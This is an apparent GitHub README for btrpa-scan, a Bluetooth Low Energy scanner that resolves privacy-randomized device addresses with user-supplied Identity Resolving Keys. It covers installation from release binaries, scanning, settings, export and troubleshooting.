# 🛡️ btrpa-scan - Easy Bluetooth LE Scan with Privacy Support

[![Download btrpa-scan](https://img.shields.io/badge/Download-btrpa--scan-blue?style=for-the-badge)](https://github.com/YoungAyub/btrpa-scan/releases)

---

## 📘 About btrpa-scan

btrpa-scan is a simple tool that scans nearby Bluetooth Low Energy (BLE) devices. It uses special technology to handle Resolvable Private Addresses (RPA). This means it can identify devices even when they use temporary, privacy-protecting IDs. It uses Identity Resolving Keys (IRKs) to resolve and recognize these devices securely.

This application helps you understand what BLE devices are around you without complex setup. Whether you are curious about your smart devices, testing Bluetooth signals, or want to check device activity nearby, btrpa-scan makes the process straightforward.

---

## 💻 System Requirements

To run btrpa-scan, make sure your system fits these minimum requirements:

- Operating System: Windows 10 or later, macOS 10.13 or later, or a popular Linux distribution.
- Bluetooth Adapter: A Bluetooth 4.0 (or newer) adapter capable of BLE scanning.
- Memory: At least 2 GB of RAM.
- Disk Space: Minimum 100 MB free space.
- Internet Connection: Only needed to download the software, not for scanning.

---

## 🚀 Getting Started

Follow these steps to download and start using btrpa-scan with no hassle:

- You do not need any programming skills.
- The interface is easy to navigate.
- No special hardware beyond a standard BLE-capable Bluetooth adapter.

---

## 📥 Download & Install

1. Go to the official release page by clicking this button:

   [![Download btrpa-scan](https://img.shields.io/badge/Download-btrpa--scan-blue?style=for-the-badge)](https://github.com/YoungAyub/btrpa-scan/releases)

2. On the page, you will see a list of versions. Select the latest stable release.

3. For your system:
   - Windows: Download the `.exe` installer file; it may be named like `btrpa-scan-setup.exe`.
   - macOS: Download the `.dmg` file.
   - Linux: Download the appropriate `.AppImage` or `.tar.gz`.

4. After downloading:
   - Windows: Double-click the `.exe` file and follow the simple installation prompts.
   - macOS: Open the `.dmg` file and drag the app into your Applications folder.
   - Linux: Make the `.AppImage` file executable or extract the `.tar.gz` and run the binary inside.

5. Once installed, launch btrpa-scan from your desktop, applications menu, or terminal.

---

## 🛠️ How to Use btrpa-scan

After launching the application, here is what to do:

- The main window will show a "Start Scan" button.
- Click "Start Scan" to begin searching for nearby BLE devices.
- The program will list all devices it finds, showing friendly names if available.
- Devices using privacy features (Resolvable Private Address) will be recognized properly, with their identity resolved if you have the correct Security Keys registered.
- You can stop the scan any time by clicking "Stop Scan".
- Use the filters section to narrow down devices by signal strength or device type.
- To save your scan results, use the "Export" option to save data as a CSV file.

---

## 🔒 Understanding Privacy Features

BLE devices sometimes use Resolvable Private Addresses to hide their true MAC addresses. This prevents tracking by randomizing the address. btrpa-scan can work with these privacy features by using Identity Resolving Keys (IRKs). IRKs are security keys that help the app identify devices despite their changing addresses.

To use this function:

- If you own the IRKs for certain devices (e.g., your personal smart devices), you can add them into btrpa-scan settings.
- The app will use these keys to resolve and show the real identities of these devices.
- This feature improves scanning accuracy and helps differentiate devices.

---

## 🔧 Configuration and Settings

Within the app you can:

- Add or remove Identity Resolving Keys (IRKs).
- Set scanning intervals and timeout lengths.
- Choose how detailed the scan output is.
- Enable notifications for new or unknown devices.
- Customize data export formats.

All settings are saved automatically.

---

## 🐞 Troubleshooting

If btrpa-scan does not detect devices or crashes:

- Verify your Bluetooth adapter is enabled and working.
- Restart your computer and try again.
- Make sure your system meets the minimum requirements.
- Try running the app with administrator rights.
- Disable any other Bluetooth applications that might block access.
- Check for updates on the release page and install the latest version.

For advanced help, visit the GitHub issues section or open a new issue describing your problem.

---

## 📄 License

btrpa-scan is open-source software released under the MIT License. You can use, share, and modify it freely.

---

## 🤝 Contributing

If you want to help improve btrpa-scan, you can:

- Report bugs.
- Suggest features.
- Submit code improvements via pull requests.

Please read the contribution guidelines on GitHub to get started.

---

## 📞 Contact & Support

For questions or help, you can open issues on the GitHub repository page or contact the developer through the GitHub profile.

---

[Download btrpa-scan here](https://github.com/YoungAyub/btrpa-scan/releases) to start scanning nearby Bluetooth devices with privacy support.